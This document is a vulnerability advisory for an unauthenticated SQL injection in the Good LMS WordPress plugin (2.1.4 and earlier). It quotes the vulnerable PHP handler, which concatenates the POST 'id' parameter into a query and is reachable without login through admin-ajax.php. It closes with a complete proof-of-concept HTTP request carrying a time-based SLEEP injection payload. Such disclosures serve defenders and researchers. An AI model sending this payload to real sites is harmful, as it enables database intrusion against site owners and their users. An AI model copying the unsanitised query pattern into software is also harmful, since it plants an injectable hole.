
## Wordpress Plugin Good LMS 2.1.4 - 'id' Unauthenticated SQL Injection
## Software Link: https://codecanyon.net/item/good-lms-learning-management-system-wp-plugin/9033850
## Version: <= 2.1.4
## Tested on: linux/apache
## Vulnerability Type :SQL Injection




```
Unauthenticated SQL Injection in Good Layers LMS Plugin <= 2.1.4

```


```
Plugin URL: https://codecanyon.net/item/good-lms-learning-management-system-wp-plugin/9033850
```

 

```
Following is the vulnerable code in file "goodlayers-lms/include/lightbox-form.php" from line 682 to 701


add_action( 'wp_ajax_gdlr_lms_cancel_booking', 'gdlr_lms_cancel_booking' );
add_action( 'wp_ajax_nopriv_gdlr_lms_cancel_booking', 'gdlr_lms_cancel_booking' );
function gdlr_lms_cancel_booking(){
global $wpdb;

$sql = 'SELECT * FROM ' . $wpdb->prefix . 'gdlrpayment ';
$sql .= 'WHERE id=' . $_POST['id'] . ' AND ';
$sql .= '(payment_status=\'pending\' OR payment_status=\'submitted\' OR payment_status=\'reserved\')';
$booked_course = $wpdb->get_row($sql);
if( !empty($booked_course) ){
$payment_info = unserialize($booked_course->payment_info);

$course_options = gdlr_lms_get_course_options($booked_course->course_id);
$course_options['booked-seat'] = intval($course_options['booked-seat']) - intval($payment_info['amount']);
update_post_meta($booked_course->course_id, 'gdlr-lms-course-settings', wp_slash(json_encode($course_options, JSON_UNESCAPED_UNICODE)));

$wpdb->delete( $wpdb->prefix . 'gdlrpayment', array('id'=>$_POST['id']), array('%d'));
}
die("");
}



Line 682 means that function "gdlr_lms_cancel_booking" can be called using "/wp-admin/admin-ajax.php" by having any low privileged account such as subscriber or contributor. However the "nopriv" in line 683 means that the same function "gdlr_lms_cancel_booking" can also be called as an unauthenticated user. Following URL means that an attacker is already inside function "gdlr_lms_cancel_booking".
```

 

```
http://www.example.com/wp-admin/admin-ajax.php?action=gdlr_lms_cancel_booking
```

 

```
SQL Injection on line 688 is pretty simple to understand that an arbitrary user input in POST Request is sent straight into the MySQL Query as variable "id"
```

 

```
$sql .= 'WHERE id=' . $_POST['id'] . ' AND ';
```

 

```
Following are the Request Headers as POC which demonstrates MySQL SLEEP Query.
```

 

POST:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

action=gdlr_lms_cancel_booking&id=(SELECT 1337 FROM (SELECT(SLEEP(10)))MrMV)
```

 

